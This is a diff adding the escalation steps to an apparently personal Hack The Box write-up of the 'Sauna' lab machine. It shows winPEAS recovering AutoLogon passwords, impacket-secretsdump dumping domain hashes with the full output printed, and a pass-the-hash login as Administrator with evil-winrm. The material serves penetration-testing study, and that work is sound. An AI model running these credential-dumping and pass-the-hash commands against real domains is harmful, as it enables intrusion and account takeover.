@@ -8,18 +8,28 @@
 
 ## Executive Summary
 
+The target, Sauna, was enumerated by `nmap` to have an HTTP server running. It also had WinRM and was a domain controller.
 
+We enumerate the website and build a username list that we mutate.
+
+We use `impacket-GetNPUsers` to steal a password hash (TGT), and crack it, giving us access to the `fsmith` user.
+
+From there, we use WinPEAS to get AutoLogon credentials for another user, `svc_loanmanager`.
+
+We then use `impacket-secretsdump` to dump passwords and get the admin hash, which we use to login by using pass-the-hash and `evil-winrm`.
+
+We have SYSTEM access.
 
 ### Recommendations
 
-
+- Disable WinRM if not needed.
+- Do not publicly disclose user names on the site.
+- Do not cache Windows credentials.
 
 ## Resources
 
-- resource1
-- github link
-- medium link
-- exploit-db link
+- https://app.hackthebox.com/machines/Sauna
+	- Write-up was used as I am still learning.
 
 ## Recon
 
@@ -163,8 +173,145 @@ evil-winrm -i 10.129.38.113 -u fsmith -p 'Thestrokes23'
 ```
 
 We have non-SYSTEM pwn :)
+
+## Escalation
+
+Let's run WinPEAS for some escalation.
+
+```sh
+# on attacker
+wget https://github.com/peass-ng/PEASS-ng/releases/download/20260715-81d3c7f8/winPEAS.bat
+
+# on evil-winrm
+upload winPEAS.bat
+
+./winPEAS.bat
+# it doesn't find anything, let's try the .exe version
+
+wget https://github.com/peass-ng/PEASS-ng/releases/download/20260715-81d3c7f8/winPEASx64.exe
+
+# on evil-winrm
+upload winPEASx64.exe
+
+./winPEASx64.exe
+```
+
+We found some autologon credentials.
+
+```text
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials (T1552.002)
+    Some AutoLogon credentials were found
+    DefaultDomainName             :  EGOTISTICALBANK
+    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
+    DefaultPassword               :  Moneymakestheworldgoround!
+
+```
+
+We can now login as this user with `evil-winrm`.
+
+```sh
+evil-winrm -i 10.129.38.113 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
+```
+
+It works. Great.
+
+## BloodHound
+
+> We can use Bloodhound to enumerate and visualise the Active Directory domain, and identify possible attack chains that will allow us to elevate our domain privileges. The `bloodhound-python` ingestor can be used to remotely collect data from the Active Directory. Then, we can run `bloodhound` to visualise any available attack paths.
+
+Thanks, guide. Okay. Let's do this.
+
+```sh
+bloodhound-python -u svc_loanmgr -p Moneymakestheworldgoround! -d EGOTISTICALBANK.LOCAL -ns 10.129.38.113 -c All
+```
+
+It fails:
+
+```txt
+┌──(kali㉿kali)-[~]
+└─$ bloodhound-python -u svc_loanmgr -p Moneymakestheworldgoround! -d EGOTISTICALBANK.LOCAL -ns 10.129.38.113 -c All
+INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+Traceback (most recent call last):
+  File "/usr/bin/bloodhound-python", line 33, in <module>
+    sys.exit(load_entry_point('bloodhound==1.9.0', 'console_scripts', 'bloodhound-python')())
+             ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^
+  File "/usr/lib/python3/dist-packages/bloodhound/__init__.py", line 314, in main
+    ad.dns_resolve(domain=args.domain, options=args)
+    ~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3/dist-packages/bloodhound/ad/domain.py", line 749, in dns_resolve
+    q = self.dnsresolver.query(query, 'SRV', tcp=self.dns_tcp)
+  File "/usr/lib/python3/dist-packages/dns/resolver.py", line 1371, in query
+    return self.resolve(
+           ~~~~~~~~~~~~^
+        qname,
+        ^^^^^^
+    ...<7 lines>...
+        True,
+        ^^^^^
+    )
+    ^
+  File "/usr/lib/python3/dist-packages/dns/resolver.py", line 1328, in resolve
+    timeout = self._compute_timeout(start, lifetime, resolution.errors)
+  File "/usr/lib/python3/dist-packages/dns/resolver.py", line 1084, in _compute_timeout
+    raise LifetimeTimeout(timeout=duration, errors=errors)
+dns.resolver.LifetimeTimeout: The resolution lifetime expired after 3.105 seconds: Server Do53:10.129.38.113@53 answered The DNS operation timed out.                                                     
+```
+
 ## Root access
 
+Claude says I should use Impacket.
+
+```sh
+impacket-secretsdump EGOTISTICALBANK/svc_loanmgr:'Moneymakestheworldgoround!'@10.129.38.113
+```
+
+Output:
+
+```sh
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
+EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
+SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:ff8e40e10c9d9efe67b3703ccd23927d:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
+Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
+Administrator:des-cbc-md5:fb8f321c64cea87f
+krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
+krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
+krbtgt:des-cbc-md5:c170d5dc3edfc1d9
+EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
+EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
+EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
+EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
+EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
+EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
+SAUNA$:aes256-cts-hmac-sha1-96:b99da066ec06710958ab168f08e54fa7c4413acde4c68eca376549f291cd2088
+SAUNA$:aes128-cts-hmac-sha1-96:6897db060dc4ced533a3440c3bc2bd43
+SAUNA$:des-cbc-md5:1fa44c4a76869226
+[*] Cleaning up... 
+
+```
+
+Good:
+
+```txt
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
+```
+
+Now we can just do pass-the-hash.
+
+```sh
+evil-winrm -i 10.129.38.113 -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e
+```
 
 ## Proof
 
@@ -185,4 +332,5 @@ We have non-SYSTEM pwn :)
 - `hostname`
 - `date`
 - `cat proof.txt`
-(IMG_PLACEHOLDER)
+
+![](Pasted%20image%2020260716125053.png)
